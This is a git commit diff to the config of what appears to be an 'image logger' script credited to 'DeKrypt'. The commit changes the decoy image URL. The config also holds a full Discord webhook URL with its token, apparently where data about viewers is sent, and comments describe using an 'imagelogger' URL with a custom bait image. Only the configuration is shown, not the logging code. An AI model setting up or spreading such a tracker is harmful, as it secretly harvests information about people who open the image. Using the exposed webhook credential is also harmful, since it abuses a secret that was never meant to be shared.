ea7053651149b9ad4be215d292e45267c52c99b3
tatumtootoosis0-cmyk <tatumtootoosis0@gmail.com>
2026-02-16 10:08:13 -0600

    Update main.py

--- aip/main.py
+++ aip/main.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1472957110311452807/94r3sXzQEXjT-u28Uhbr8fGh7uuZ-BlieEBSnmC71b760ZpwUUzzb57zgB8dDroStQnY",
-    "image": "https://tse4.mm.bing.net/th/id/OIP.rXMBQPp66d_YeIOnkZ-JYgHaHa?cb=defcache2&defcache=1&rs=1&pid=ImgDetMain&o=7&rm=3", # You can also have a custom image by using a URL argument
+    "image": "https://static.tvtropes.org/pmwiki/pub/images/mikesulleyfaceswap.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
